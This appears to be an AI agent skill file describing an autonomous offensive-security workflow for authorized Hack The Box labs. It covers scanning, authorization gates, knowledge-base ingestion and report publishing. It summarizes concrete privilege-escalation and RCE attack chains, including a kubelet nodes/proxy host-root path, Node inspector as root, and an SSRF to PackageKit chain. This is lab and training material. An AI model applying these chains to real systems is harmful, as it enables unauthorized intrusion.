---
name: sedna-cyber-workflow
description: "Unified offensive loop: Sedna + HexStrike + reports."
version: 1.3.1
author: Gabriele (maintainer), Hermes Agent
license: MIT
platforms: [linux]
metadata:
  hermes:
    tags: [sedna, hexstrike, htb, reconnaissance, knowledge-base, pt-report, adaptive-planning]
    related_skills:
      - hexstrike-kali-htb
      - noninvasive-recon-reporting
      - security-lab-tooling
      - security-lab-containers
---

# Sedna Cyber Workflow Skill

A unified closed-loop offensive security workflow connecting Sedna's strategic knowledge ingestion, 4-lane retrieval, and engagement journal with HexStrike MCP scanning, containerized Kali tooling, and rolling `pt-report` publication.

## When to Use

- Operating on authorized Hack The Box machines, CTF challenges, or lab penetration tests.
- Ingesting writeups, technical notes, or cheat sheets to guide active testing.
- Retrieving source-backed strategy, analogous case studies, or counter-indications prior to running scans.
- Executing scans through HexStrike MCP while maintaining crash-safe audit logs.
- Promoting verified penetration testing results into the permanent knowledge repository.
- Generating simultaneous immutable audit reports and Tailscale-shared HTML reports.

**Don't use for:**
- Unauthorized scanning or public targets outside explicit scope.
- Direct automated exploitation without operator authorization and validation.

## Prerequisites

1. Host HTB/Lab VPN active (`tun0` up). Start it as daemon:
   `sudo -n /usr/sbin/openvpn --config ~/machines_eu-5.ovpn --daemon --log /tmp/openvpn-eu5.log`
   (NOPASSWD sudo is configured for `/usr/sbin/openvpn` only).
   **Pitfall:** some HTB edge profiles stall right after `VERIFY OK: depth=0`
   and never finish the handshake (observed on eu-dedivip-3; TCP 443 resets).
   If `tun0` never comes up within ~15s, don't debug MTU/ciphers — download a
   fresh profile for a different edge server from the HTB dashboard. Stale
   stuck daemons from the bad profile are harmless; a new instance binds tun0.
2. Docker container `hexstrike-kali` running (`network_mode: host`) with HexStrike API on `127.0.0.1:8888`.
3. Hermes MCP configured for HexStrike (`mcp_hexstrike_*` tools available).
4. Sedna plugin installed and loaded in Hermes (`provides_tools` active).
5. `pt-report.py` available in repo or path.

## Quick Reference

| Step | Primary Tool / Command | Objective |
|---|---|---|
| 1. Ingest Docs | `sedna_learn_local(source_path="/path/to/docs")` | Learn strategy from local notes/writeups |
| 2. Create Engagement | `sedna_manage_engagement(action="create", ...)` | Initialize engagement journal with proof targets |
| 3. Retrieve Context | `sedna_retrieve_knowledge(target=..., ...)` | Query references, cases, negatives, guidance |
| 4. Execute Scans | `mcp_hexstrike_nmap(...)` or Docker Kali | Execute targeted tactical enumeration |
| 4b. K8s Privesc | `nodes/proxy` → websocket exec :10250 | Host root from a privileged pod (see "Kubernetes privesc" section) |
| 5. Plan & Decide | `sedna_plan_next()` & `sedna_record_decision()` | Settle evidence and select next strategic branch |
| 6. Finalize & Promote | `sedna_manage_engagement(action="verify", ...)` | Close journal, verify proof, promote case study |
| 7. Publish Report | `./pt-report.py render --engagement <slug>` | Generate HTML report for Tailnet sharing |

## Procedure Gates (blocking — read before Step 1)

Fifteen gates, each one the control for a mistake that was actually made during an authorized
engagement (objective reached, but only after eleven measured failures; G12-G14 were added
afterwards, from three failures the first eleven did not cover, and G15 from a configuration
fault found on this host — six copies of this skill, three of them different, two not under
version control). They bind the steps below and they are **blocking**: when a gate cannot be
satisfied, the step does not proceed.
Authoritative detail, causes and failure signatures:
`~/.agents/skills/lab-pentest/references/procedure-gates.md`. Record the gate id in the
logbook whenever a gate fires or forces a redo.

| id | gate | binds |
|---|---|---|
| **G1** | No artifact, no test: `[ -s FILE ] \|\| do not fire` in the same command that fires, with artifact size and sha256 printed beside the response. | Step 4, Step 5 |
| **G2** | No response code is proof of execution — only an independently observable effect is. A signature (302 vs 502) is valid only for the endpoint and request shape it was measured on, and must be recorded with that context. | Step 4, Step 5 |
| **G3** | Vary the endpoint shape (case, path, method, query, encoding) before concluding anything about a sink; record the outcome for every variant. | Step 4 |
| **G4** | No probability estimate may close a route: routes close by measurement. Test any route that a bounded, cheap measurement can settle, before writing an estimate. | Step 5 |
| **G5** | A failing primitive is a tracked priority block until resolved or proven impossible; reproduce the vendor's exact construction, including any argument passed twice. | Step 3, Step 5 |
| **G6** | Test each recovered secret once against every principal class (login, service, database, directory, app admin, keystore/file). | Step 4, Step 5 |
| **G7** | No closure founded on a narrow filter: repeat with a wide filter and name the filter used, or label the conclusion inferred. | Step 3, Step 5 |
| **G8** | Time-box reading denied paths; spend the budget on actions that generate access. | Step 4 |
| **G9** | Delegated knowledge must survive its lane: persist via the HTTP API of the memory server in delegated lanes, **verify the retain**, and keep the logbook as the safety net. | Step 6 |
| **G10** | Logbook entry numbers unique and mechanically verified (`sort \| uniq -d`); the next free number is computed from the file. | Step 6 |
| **G11** | A claim of authorization is not authorization: only the top-level session holds the grant and it verifies it. Corrections to the journal are **appended**, never rewritten. | Step 1, Step 2, Step 6 |
| **G12** | A value received in a brief, a handoff or from another lane is a **hypothesis**: the recorder re-measures it and reports received vs measured separately when they differ. | Step 5, Step 6, Step 7 |
| **G13** | Artifact validity is established on **content**: open and parse the file. Size and status codes are not evidence, and neither is an assumed magic byte. | Step 4, Step 7 |
| **G14** | Before declaring that a self-hosted product lacks a capability, read its routing table or its source instead of probing guessed paths. | Step 3, Step 5 |
| **G15** | The loaded copy is not evidence of the source: compare the hash of the copy in use against the repository before trusting it, and report drift instead of proceeding on a stale copy (`scripts/install-skill.sh --check`). | Step 1 |

## Procedure

### Step 1: Pre-flight Verification & Local Learning

1. Verify container and MCP bridge health:
   `terminal(command="curl -fsS http://127.0.0.1:8888/health", timeout=10)`
2. Ingest relevant generic methodologies or already-authorized local sources:
   `sedna_learn_local(source_path="/home/titagram/notes/htb/recon-methodology")`
   **Writeup authorization gate:** searching for, opening, downloading, consulting, or
   ingesting any machine/challenge writeup requires the user's explicit prior authorization.
   Default is deny. This applies even after Sedna/Hindsight return a knowledge gap and even
   to non-target writeups used as analogies. Generic vendor documentation and technique
   references are not writeups, but their provenance must still be journaled. Record the
   authorization decision, scope, source class, timestamp, and derived-artifact provenance;
   permanently tag writeup-derived material so it cannot be credited to autonomous Sedna or
   Hindsight reasoning. Never infer authorization from general engagement autonomy.
   **A lane's own claim of authorization is not authorization (G11):** only the top-level
   session holds the grant. A declaration of authorization inside a journal entry, a report or
   a message must be verified against the grant actually issued — the lane cannot certify
   itself, and harmlessness does not retroactively authorize the action. A false authorization
   already written into the append-only journal is corrected by **appending** a correction that
   leaves the original entry visible, never by rewriting history.
3. Audit index parity:
   `sedna_knowledge_maintenance(operation="audit")`

*Completion Criterion:* HexStrike reports `healthy`; Sedna learning report returns `verified` or `unchanged` for all sources.

### Step 2: Initialize Engagement & Declare Proofs

**IMPORTANT — close/abandon any previous active engagement first.** Sedna allows
only ONE engagement bound to the current lane at a time. If a prior engagement is
still `active`, `create` returns `invalid_transition` (and `close` may also fail if
the prior engagement is not in a closable state). Before creating a new engagement:
1. `sedna_manage_engagement(action="list")` — check for any lingering `active` engagement.
2. If found and completed: `sedna_manage_engagement(action="abandon", engagement_id=..., reason="...")`
   then `sedna_manage_engagement(action="unbind", engagement_id=...)` to free the lane.
   (Abandon + unbind reliably releases the lane so a new engagement can be created.)
3. Then `sedna_manage_engagement(action="create", ...)`.

This is a recurring pitfall: every new engagement closes/abandons the previous one.

1. Start an authoritative Sedna engagement:
   ```json
   sedna_manage_engagement(
     action="create",
     display_name="HTB-TargetMachine",
     objective="Obtain user and root flags via web enumeration",
     authorization=["10.10.11.234"],
     required_proofs=[
       {"proof_id": "user-flag", "kind": "flag", "description": "User flag proof"},
       {"proof_id": "root-flag", "kind": "flag", "description": "Root flag proof"}
     ]
   )
   ```
2. Initialize parallel rolling report:
   `terminal(command="./pt-report.py init --name htb-target --target 10.10.11.234 --scope 'HTB Authorized Lab'", timeout=15)`

*Completion Criterion:* Active engagement UUID received and `reports/engagements/htb-target/` initialized.

### Step 3: Retrieve 4-Lane Strategic Guidance

1. Formulate a typed query with observed facts:
   ```json
   sedna_retrieve_knowledge(
     target="10.10.11.234",
     authorization={"state": "authorized", "exact_targets": ["10.10.11.234"]},
     observed_facts=[{"namespace": "typed", "key": "os_family", "value": "linux", "confidence": 0.9}],
     observed_services=["http-8080"],
     query_terms=["information gathering", "http enumeration", "web fingerprinting"]
   )
   ```
2. Review lane outputs:
   - **References:** Technical baseline and service behavior.
   - **Case Steps:** Analogous historical techniques (check transfer conditions).
   - **Negative Evidence:** Historical failed paths to deprioritize.
   - **Decision Guidance:** Recommended next actions.
3. Drill down into exact source provenance if necessary via `sedna_get_knowledge_artifact`.

*Completion Criterion:* Retrieval returns structured lanes without hard incompatibility rejections.

### Step 4: Execute Scans via MCP & Kali

1. Get parameter recommendations from HexStrike intelligence:
   `terminal(command="curl -s -X POST http://127.0.0.1:8888/api/intelligence/optimize-parameters -H 'Content-Type: application/json' -d '{\"target\":\"10.10.11.234\",\"tool\":\"nmap\"}'", timeout=15)`
2. Run scan through HexStrike MCP or container wrapper:
   `mcp_hexstrike_nmap(target="10.10.11.234", scan_type="-sV", ports="22,8080")`
   *(Sedna observer hooks automatically log commands and sanitized outputs to the private journal.)*
3. Import scan results to rolling report:
   `terminal(command="./pt-report.py import-nmap --engagement htb-target --xml /tmp/scan.xml", timeout=15)`

*Completion Criterion:* Scan completes, ports/services are identified, and raw outputs are captured in evidence.

### Plan_next failure: `settlement_unavailable` (observed 2026-09-11)

`sedna_plan_next` returned `failure_code=settlement_unavailable` even with a
clean active engagement (0 in_flight_calls, no unresolved proofs). This is a
runtime state issue — the planner cannot settle the journal's pending
evidence. Do NOT loop retrying it (3 attempts all fail identically). Fallback:

1. Use `sedna_retrieve_knowledge` with the abstracted **primitive** (not machine
   names) to get the strategic lanes directly.
2. Use `hindsight_recall` (semantic, covers lexical gaps) when Sedna is empty.
3. Record the strategy via the journal if `sedna_record_decision(custom_strategy=...)`
   accepts it; if that also returns `invalid_transition`, proceed with the
   retrieved/recalled lanes as the governing plan and note it in the report.
4. A planner/tool bug must not stall the offensive loop — the agent executes
   from the best retrieved strategy.


### Step 5: Adaptive Planning & Decision Recording

1. Settle evidence and compute the next hypothesis branch:
   `sedna_plan_next(max_proposals=5)`
2. Record the chosen strategic direction:
   `sedna_record_decision(proposal_id="<selected-uuid>")`
   *(Or specify `custom_strategy` and `rationale` if pivoting.)*
3. Repeat Steps 3–5 as new attack surface is discovered until objective proofs are obtained.

*Completion Criterion:* Decision recorded in `events.jsonl` and reflected in active plan state.

### Step 6: Close, Verify Proofs & Promote Knowledge

1. Settle evidence and close engagement:
   `sedna_manage_engagement(action="close", reason="All required proof criteria met")`
2. Submit verification to launch the promotion saga:
   ```json
   sedna_manage_engagement(
     action="verify",
     verification_kind="platform",
     verification_reference="htb-flag-submission-confirmed"
   )
   ```
3. Verify that the promotion saga successfully promoted the sanitized case study:
   `sedna_manage_engagement(action="inspect")`
4. Render rolling report and verify Tailscale endpoint:
   `terminal(command="./pt-report.py render --engagement htb-target", timeout=15)`

*Completion Criterion:* Sedna engagement status is `closed_verified`, case study is promoted to canonical repository, and report HTML is rendered.

## Writeup Ingestion Path (IMPORTANT)

Sedna's deterministic classifier (`sedna/knowledge/classifier.py`) accepts a
writeup **only if its path matches a corpus-family marker**. A writeup placed
at the repo root (e.g. `~/htb-writeups/Nibbles.md`) is classified
`ambiguous` → `foundation_quarantined`. To be accepted as a `case_study`, the
file MUST live under one of these path prefixes:

- `write-ups/machines/<Machine>/<Machine>.md` → `machine_walkthrough` (case_study)
- `write-ups/challenges/<Name>/<Name>.md` → `challenge_walkthrough` (case_study)
- `write-ups/academy/...` or `01_information-gathering/...` → reference/lesson

So when ingesting a folder of HTB writeups, first reorganize them into
`write-ups/machines/<Machine>/<Machine>.md` (one subdir per machine), then call
`sedna_learn_local(source_path="<repo>/write-ups")`. The classifier also
requires `procedural` signals (≥2 substantive headings + ≥1 code block, or
action+result language) and redacts platform flag literals.

## KB Deadlock Recovery (IMPORTANT)

Sedna's knowledge base can enter a self-locking deadlock after interrupted
ingestion runs (killed processes, crashes, 420s timeouts). Leftover artifacts
create a cycle where every path out is blocked by another piece of the same
corrupted state:

```
stale bundle (v2) remaining
  → initial audit fails (finds stale bundles)
  → Sedna writes marker ".retrieval.sqlite.unavailable"
  → index marked unavailable → retrieval blocked
  → barrier_source_revision fails
      ("source projection absence could not be proven")
  → cannot transition sources (accepted → verified)
  → cannot recompile stale bundles (v2 → v7)
  → (loops back: stale bundles still there → audit fails again)
```

**"Broke" = retrieval returns `retrieval_unavailable` and there is no way to
recompile**, because every exit route is closed by another piece of the same
corrupt state.

### Trigger symptoms
- `source projection absence could not be proven` (repository.py:980)
- `retrieval_unavailable` on `sedna_retrieve_knowledge`
- Initial audit fails / marker recreated on startup

### Recovery procedure (backup before every delete — all reversible)
The index is **disposable by design**: it rebuilds from manifests, so removing
bundles/barriers/markers loses nothing — it regenerates. Backups live in
`/tmp/sedna-*-backup/`.

| # | Step | Why |
|---|------|-----|
| 1 | Backup orphan barriers (`transactions/*.projection-revision.json`) | reversibility |
| 2 | Remove orphan barriers | unblocks `barrier_source_revision` |
| 3 | Backup stale bundles (old version, e.g. v2) | reversibility |
| 4 | Remove stale bundles | initial audit passes |
| 5 | Remove marker `.retrieval.sqlite.unavailable` | index "available" again |
| 6 | Rebuild index (`~/sedna/rebuild_index.py`) | regenerate 29 source / ~189 artifacts |
| 7 | Verify retrieval end-to-end | confirm no longer `retrieval_unavailable` |

Then re-run the generalization test (`sedna_retrieve_knowledge` on a target
**not** ingested).

## Semantic LLM Providers: Local Ollama or Codex CLI (IMPORTANT)

Do NOT use Hermes-routed `ctx.llm` for semantic extraction: it does not inherit
session `-m/--provider` flags and may resolve to an exhausted OpenRouter fallback.
Use one of the explicit opt-in hosts instead:

- **Free local host**: `SEDNA_OLLAMA_LLM=1`, implemented by
  `semantic/ollama_host.py`; default model `qwen3.6:latest` on local Ollama.
  `qwen3.6` verified end-to-end on Facts and DevArea, but it is not uniformly
  schema-compliant across heterogeneous writeups. Real failures include missing
  typed-context `origin`, empty required citations, invalid
  `platform_constraints.relation="unknown"`, and critic quarantines for
  `origin_mismatch` / `unsupported_claim`. Keep validation fail-closed; do not
  promote failed or quarantined output.
- **Reliable paid fallback**: `SEDNA_CODEX_LLM=1`, implemented by
  `semantic/codex_host.py` (`CodexCliHost`) using `codex exec`. Codex CLI auth is
  OAuth in `~/.codex/auth.json`; default model is `gpt-5.5`.

### Enabling cloud models (structured output) — COMMIT 2b571a8
The extraction pipeline can now also run on **cloud Ollama models** (`gpt-oss:120b`,
`deepseek-v4-flash:0731`) via three changes that work together:

1. **`accepts_schema=True`** on `OllamaHost` + pass the **real JSON Schema** in
   `response_format.json_schema` (OpenAI-compatible) or `format` (native). A bare
   `json_object` hint is not enough — weak models echo the payload or emit
   schema-nonconformant JSON.
2. **`COMPACT_EXTRACTOR_PROMPT`**: the verbose `EXTRACTOR_PROMPT` overflows cloud
   models (saturates max_tokens → `missing_parsed_response`). The compact variant
   keeps the essential invariants (segment accounting, credential handling,
   placeholder binding policy). The schema MUST still be embedded in the text too
   (removing it alone also breaks them).
3. **Flat segment text** (with explicit `--- segment N ---` markers) instead of the
   JSON-serialized `SafePreparedSourcePayload`, which overflows these models.
   Segment accounting is recomputed deterministically by Sedna.

**Result:** `gpt-oss:120b` now runs the full extract+critic pipeline end-to-end
(~34s on Facts, valid bundles). `deepseek-v4-flash:0731` works in isolation
(27–44s) but stays **inconsistent** in the real pipeline (sometimes saturates
output → None/invalid). Prefer `gpt-oss:120b` for cloud; keep validation fail-closed.
- **Batch observability requirement**: never run a long multi-source batch with
  only a final buffered report. Persist and flush a checkpoint after every
  source (path, start/end, disposition, reason codes, calls/tokens, cumulative
  verified/quarantined/failed). Otherwise an interrupted run leaves accepted
  manifests but loses the per-source failure report, making a progressing batch
  look stalled.
- Always run Codex from a neutral cwd (e.g. `/tmp`); use
  `--skip-git-repo-check` where appropriate.

## Agent-Driven KB Population (PREFERRED — MOST RELIABLE)

**Lesson (measured):** the host-LLM extractor (`gpt-oss:120b` / `deepseek-v4-flash`)
is **unreliable** for generating the large `SemanticDraftBundle` schema in a single
structured call — even after the structured-output, compact-prompt, flat-text, $defs
removal, dedup, and decomposition fixes. The **main agent** (me), acting with
read + build + validate + materialize tools, produces valid bundles **3/3** on
writeups of very different complexity (Facts, DevArea, Nibbles) — because it reads
the content and adapts, rather than forcing one huge structured response through a
weak model. **Prefer this path for populating the KB.**

### When to use
- Ingesting HTB/CTF writeups into the Sedna KB when the automatic extractor is
  unreliable or you want higher-quality case artifacts.

### Exact repeatable procedure

For each writeup at `write-ups/machines/<Machine>/<Machine>.md`:

1. **Prepare the source** and read its segments (get the segment count and per-segment
   text so citations use correct global indexes):
   ```python
   from test_semantic_llm import _prepared_from_markdown  # tests/knowledge/
   prepared = _prepared_from_markdown(md_text, title="Machine: <Name>")
   len(prepared.segments)  # e.g. Facts=7, DevArea=8, Nibbles=1
   # inspect each prepared.segments[i].text to cite correctly
   ```
2. **Read the writeup** carefully and construct a `SemanticDraftBundle` dict manually
   from its real content — the case steps must follow the chronological attack chain
   (recon → enum → exploit → privesc → flags), each with:
   - `state_before`/`state_after` each carrying **`access` (REQUIRED)**, `environment`,
     `privileges`
   - `evidence` (summary, origin, category), `hypotheses` (statement, origin),
     `selected_action` (intent), `origin`
   - `citations` with `segment_indexes` pointing at the GLOBAL source segment indexes
   - `local_id` values unique within the bundle; execution_example `parent_local_id`
     must reference a **reference or case-step** local_id (NOT the case's own id)
   - `command_template` placeholders `{{name}}` must exactly match the declared
     `placeholders` list (name/kind/binding_policy/role)
   - `platform_constraints` (dimension/relation/value/citations)
3. **Validate** against the real schema:
   ```python
   from sedna.knowledge.semantic.drafts import SemanticDraftBundle
   bundle = SemanticDraftBundle.model_validate(bundle_dict)
   ```
4. **Check segment accounting** (every segment cited or ignored):
   ```python
   from sedna.knowledge.semantic.materialize import validate_segment_accounting
   validate_segment_accounting(prepared, bundle)
   ```
   If a segment isn't cited, add it to `ignored_segment_indexes`.
5. **Materialize** into canonical artifacts:
   ```python
   from sedna.knowledge.semantic.materialize import materialize_semantic_content
   from sedna.knowledge.schema.common import VerificationStatus
   from sedna.knowledge.schema.semantic import SemanticCallMetadata
   call_meta = SemanticCallMetadata(purpose="sedna.semantic.extract", provider="agent",
       model="<current-model>", agent_id="agent-main", input_tokens=0, output_tokens=0)
   content = materialize_semantic_content(prepared, bundle, call_meta, VerificationStatus.VERIFIED)
   ```
6. **Persist** the result: write the canonical bundle + update the manifest/index so it
   is retrievable (mirror how `sedna_learn_local` persists a verified bundle), or run the
   batch through the real runtime on a fresh KB root first to validate end-to-end.

### Schema gotchas that commonly trip agent-authored bundles
- `CaseState` requires **`access`** (a non-empty string) on both `state_before` and
  `state_after` — this was the #1 manual-validation error.
- Execution-example `parent_local_id` must point at a **reference/case-step** id, not a
  case id.
- `DraftCaseStep` ordinals must be consecutive starting at 1.
- Placeholders in `command_template` and the declared `placeholders` list must match
  exactly (token ↔ name), and `binding_policy` must follow kind rules.
- `origin` must be a valid enum (`explicit`/`inferred`/`derived`); keep `explicit`
  only when the segment directly supports the claim.
- Raw flags are always redacted — never include flag-shaped proof values.

### Reference scripts (persistent — survive reboot)
All agent-population scripts and the 27 validated bundles live in
`~/sedna/scripts/agent-populate/` (copies also under `/tmp/` while the session
is alive). Use the persistent paths:
- `~/sedna/scripts/agent-populate/agent_kb_test.py` — single-machine (Facts) agent-built bundle + materialize.
- `~/sedna/scripts/agent-populate/repeatability_test.py` — 3-machine repeatability
  (Facts/DevArea/Nibbles) with working `facts_bundle()`, `devarea_bundle()`,
  `nibbles_bundle()` templates to copy for new writeups.
- `~/sedna/scripts/agent-populate/agent_populate_from_json.py` — feed validated
  bundles to a FRESH temp root.
- `~/sedna/scripts/agent-populate/agent_relearn.py` — feed validated bundles to an
  EXISTING root (does NOT destroy it), letting Sedna transition quarantined→verified.
- `~/sedna/scripts/agent-populate/bundles/*.json` — the 27 validated bundles.
- `~/sedna/scripts/agent-populate/bundle_schema_guide.md` — schema construction guide.

### Consolidating agent-built bundles into the real KB (validated 27/27)

The real KB already has the 27 writeup manifests in `quarantined/excluded` state
(from earlier failed host-LLM runs). Sedna fail-closed will NOT reprocess an
already-excluded source, and a manually-copied `verified` bundle over a
`quarantined` manifest makes the rebuild reject it as `CANONICAL_REPOSITORY_INVALID`.
The correct, reversible path is:

1. **Back up** the real KB first (manifests + bundles + indexes), e.g.
   `cp -rp ~/.hermes/knowledge/sedna /tmp/sedna-kb-backup-<ts>`.
2. **Remove the quarantined/excluded manifests** for exactly the writeups you are
   re-populating (map machine→source_id from a temp run; source_id is
   deterministic from content). Remove their entries from `quarantine/` and
   `semantic_quarantine/` too.
3. **Re-learn against the existing root** with the stub host returning your
   agent-built bundle (`/tmp/agent_relearn.py <root>`). This transitions them to
   `verified` and persists canonical bundles.
4. **Rebuild the index** and verify counts went up (29→56 source, 189→312 artifact).

### Reactor case study (validated 2026-08-24) + retrieval param gotcha

**Reactor** (HTB Easy) was consolidated into the real KB via the agent-driven path:
Next.js 15.0.3 React Flight RCE (CVE-2025-55182) → shell as `node` → `reactor.db`
SQLite creds → crack engineer MD5 → SSH → Node.js inspector `127.0.0.1:9229` as
root → root flag. Bundle at `scripts/agent-populate/bundles/Reactor.json` (1 case,
4 steps, 2 examples). KB went 80→81 sources, 535→540 artifacts.

**Retrieval parameter gotcha (cost me a failed query):** `sedna_retrieve_knowledge`
uses **`observed_terms`** (NOT `query_terms` — that key is rejected as missing
`target`/`authorization`). Also the FTS matcher is lexical: the Reactor bundle says
"Next.js" so a query term `nextjs` does NOT match; use `reactor`, `node inspector`,
`privilege escalation`, `sqlite` to surface it. When a freshly-ingested case study
doesn't appear in retrieval, first check the FTS index directly:
`SELECT artifact_id FROM artifact_fts WHERE artifact_fts MATCH '<term>'` against
`indexes/retrieval.sqlite`, then re-query with terms that match the bundle's actual
wording.

## Hindsight Integration — Two-Tier Memory (validated 2026-08-25)

Hindsight and Sedna are **complementary, not overlapping**. Use them as a two-tier
memory: Hindsight is the fast, broad **accumulator**; Sedna is the curated, validated
**reasoner**. This is the "double training" pattern.

| | Hindsight (accumulator) | Sedna (reasoner) |
|---|---|---|
| Ingestion | `hindsight_retain` — 1 call, no schema | Bundle + validate + critic + promote |
| Speed | Extremely fast | Slow, gated |
| Coverage | Broad (everything) | Curated (high-value only) |
| Retrieval | **Semantic** (embedding) | **Lexical** (FTS) |
| Precision | Low (accepts all) | High (fail-closed) |
| Provenance | Free (tags) | Rigorous (citations, segments) |
| Availability | **Injected every turn** | Explicit `sedna_retrieve_knowledge` call |

**Why it works:** Hindsight is injected into every turn's context, so "ingestion light"
knowledge is *always* available to the agent with zero extra calls — while Sedna needs an
explicit retrieval. This closes exactly the lexical gap (e.g. `nextjs` vs "Next.js",
`employeeauthtemplate` vs "EmployeeAuthTemplate").

### Tier 1 — Hindsight ingestion light (accumulator, EVERY document)

For every writeup/document, retain a compact, tagged summary. No schema, no validation —
just fast, semantic, tagged storage:

```python
hindsight_retain(
  content="Authorized lab case <Name> (<OS>). Sanitized attack pattern: <recon> -> <exploit> -> <privesc>. Transferable techniques: <t1>, <t2>. No credentials, private proof blobs, target addresses, or flag values.",
  context="sanitized strategic summary for authorized lab case <Name>",
  tags=["authorized-lab", "<os>", "<technique1>", "<technique2>"]
)
```

**Provenance rule:** since Hindsight has no citations, bake provenance INTO the content
and tags (machine name, writeup source, date). This keeps the accumulator traceable.

### Tier 2 — Sedna (reasoner, ONLY high-value cases)

Only machines with genuinely new transferable lessons (ADCS ESC4, WAC, kubelet
`nodes/proxy`, etc.) get the full `SemanticDraftBundle` treatment (see
"Agent-Driven KB Population"). Sedna covers the high-value, validated core.

### Fallback chain (the "if it's missing in Sedna, it's in Hindsight")

```
sedna_retrieve_knowledge(target=..., ...)
  → if knowledge_gap OR case_steps empty OR only generic/irrelevant matches
    → hindsight_recall(query="<same terms>")
      → optional hindsight_reflect(query="<synthesize a recommendation>")
```

**Validated 2026-08-25 (Cohort):** Sedna had no Cohort knowledge (returned only generic
Fireflow/Intuition matches for `websocket`/`ssrf`); `hindsight_recall` recovered the full
Cohort chain (SSRF loopback bypass, hidden vhost via /status, marimo pre-auth RCE via
WebSocket /terminal/ws, PackageKit TOCTOU → SUID bash) with both flags.

### Operational notes — measured on this server, 2026-09-28

The two-tier contract above is unchanged. What follows is what the integration actually does
on this deployment, because "1 call, no schema" is not the same as "the fact was written".

**Two write paths, different health.** `hindsight_retain` from Hermes runs with
`retain_async = True` by default, so Tier 1 goes through the server's async worker queue.
On 2026-09-28 that path was failing on *every* attempt (267 retain requests, 267 errors:
`Extra data` / `Expecting value`) while the **synchronous** path stayed healthy — same model,
same provider, same content succeeding in 3–141 s. Setting
`HINDSIGHT_API_RETAIN_EXTRACTION_MODE=concise` on the server's retain path only **largely**
restored it, but not completely: measured the next day, of the 49 operations created after the
change **37 completed and 6 failed**, the last failure at 17:25 and none in the thirteen hours
after it. Treat that path as repaired *and* fragile — re-check it rather than trusting it. If it
regresses, the next remedy is a dedicated model for that path alone:
`HINDSIGHT_API_RETAIN_LLM_MODEL=deepseek-v4-pro:cloud` (measured 3/3 where `gpt-oss` was 0/3
on the same chunk). Both are one drop-in plus a restart to apply, and one `rm` plus a restart
to undo.

**A silent ingestion is not a successful ingestion.** A retain call returning is not a stored
fact: confirm the server-side operation reaches `completed`. The Hermes plugin already tracks
and waits for those operations (`_track_retain_ops`, `_wait_for_server_retain_ops`); when the
wait expires, that turn's memory is lost silently. If ingestion looks quiet, check
`hindsight operation list <bank>` before assuming the knowledge is there.

**Probe, then repair.** `POST /banks/<bank>/memories/dry-run-extract` runs the real extraction
path and writes nothing (verified: document count unchanged) — use it to test a mode, a chunk
size or a mission on real content before changing configuration.
`POST /banks/<bank>/documents/<id>/reprocess` re-runs extraction for one document and creates
a **new** operation, so it picks up current configuration. An operation whose payload was
built under the old configuration cannot be repaired by retrying it; repair the *document*.

**Do not use these as a health signal.** Fact counts are noisy — two identical extractions of
the same document returned 18 and then 15 — and non-monotonic, because consolidation merges
and invalidates units (22 577 → 22 486 while the system was behaving normally). Judge the
integration by operation status and by the facts actually deposited, never by fact totals and
never by request-level error counts (see the next paragraph).

**The health signal that lies.** Measured on 2026-09-29: every logged call under
`retain_extract_facts` failed — 13 of 13, with the same two signatures as the original defect —
while the `retain` and `batch_retain` operations of that same day **completed** and their two
documents hold twelve facts each. The path that produces the facts does not register its calls;
the path that registers them always fails and is tolerated. `llm_requests` therefore overstates
the damage and under-reports the work, and it is not a health indicator here. **Having an
indicator is not the same as having the right indicator:** the signals that hold are the
operation reaching `completed`, the document existing, and its units being there.

**The six mental-model pages are repo-shaped, not pentest knowledge.** They are the
coding-agent taxonomy ("scope this page to the repo itself"), injected every turn. Fine for
operational facts about this machine; never treat their content as verified lab knowledge and
never promote from them.

**Option for certainty over speed.** `retain_async=false` on the Hermes memory plugin makes
the write synchronous and immediately verifiable, at the cost of a few seconds of latency per
turn. Not enabled by default.

### Precedence rule (critical)

**Sedna (verified) > Hindsight (candidate).** The fallback fires ONLY when Sedna has
nothing — never when there's a conflict. A non-verified Hindsight fact must never override
a verified Sedna case. Treat Hindsight output as a *candidate* to validate, not truth.

**Planner privacy boundary:** raw Hindsight memory IDs, queries, summaries, and tags
never enter planner context, cache material, or journal payloads. The planning
boundary receives only SHA-256 digests, bounded relevance, provenance, and
`unverified_candidate` status. To influence a strategy, a recalled candidate must
first be grounded into separately observed live facts or typed primitives.

### Promotion path (accumulator → reasoner)

Hindsight → Sedna promotion is **selective and manual, never automatic**. Hindsight is the
*filter* that surfaces candidates; the agent (me) decides, reading what Hindsight recalled,
whether it deserves the full `SemanticDraftBundle` treatment in Sedna. If it were an auto-sync,
Sedna would lose its value: its strength is being curated, validated, fail-closed — not a dump
of everything. Hindsight is broad/fast; Sedna is deep/verified; promotion is the bridge that
carries only the best from accumulator to reasoner.

#### Decision checklist — promote ONLY if it clears ALL of these

1. **Transferable lesson** — the knowledge teaches a reusable technique that will help on
   future machines (ADCS ESC4, WAC 6600 foothold, kubelet `nodes/proxy` privesc, Next.js RCE
   pattern, SSRF→marimo→PackageKit chain). Not a one-off CVE with nothing new.
2. **Genuinely missing from Sedna** — a retrieval returns `knowledge_gap` or only generic
   matches. If Sedna already covers the technique (same method, transferable), skip — no
   redundancy.
3. **Strategic value** — it's offensive strategy/technique, NOT operational knowledge.
   Config paths, ports, preferences, corpus locations, two-tier memory rules → stay in
   Hindsight, never promote.
4. **No flag/credential leakage** — raw platform flags and private proof blobs are redacted
   before promotion (Sedna's saga strips private proof blobs; do not feed them in).

#### Do NOT promote when
- Only a banal/known CVE already covered → redundant.
- One-off engagement chain (specific creds, flags, a machine's unique path) → not transferable.
- Operational/knowledge facts (the two-tier rules themselves, file paths, corpus stats) → Hindsight.
- Hindsight output is a *candidate*, not verified truth — never promote an unvalidated fact that
  conflicts with an existing Sedna case (precedence rule: Sedna verified > Hindsight candidate).

#### Promotion procedure (validated path)
1. Hindsight surfaced something useful that Sedna lacks (via the fallback chain).
2. Agent builds the full `SemanticDraftBundle` from the real content (agent-driven path —
   the most reliable; see "Agent-Driven KB Population"). Do NOT hand the bundle to a weak
   host-LLM.
3. Validate against the real schema + segment accounting.
4. Back up the KB (`~/sedna/scripts/backup_kb.sh backup`), then consolidate via
   `agent_relearn.py` / promote saga.
5. Rebuild the index (`sedna_knowledge_maintenance(operation="rebuild")`) + `audit`.
6. Verify retrieval surfaces the new case study.

**Validated 2026-08-25:** Cohort (Sedna had no knowledge; Hindsight recovered the full
SSRF→marimo→PackageKit chain) is the reference candidate for the first real promotion test.

### When to use each

- **Hindsight ingestion light**: sanitized strategic patterns and non-secret operational lessons
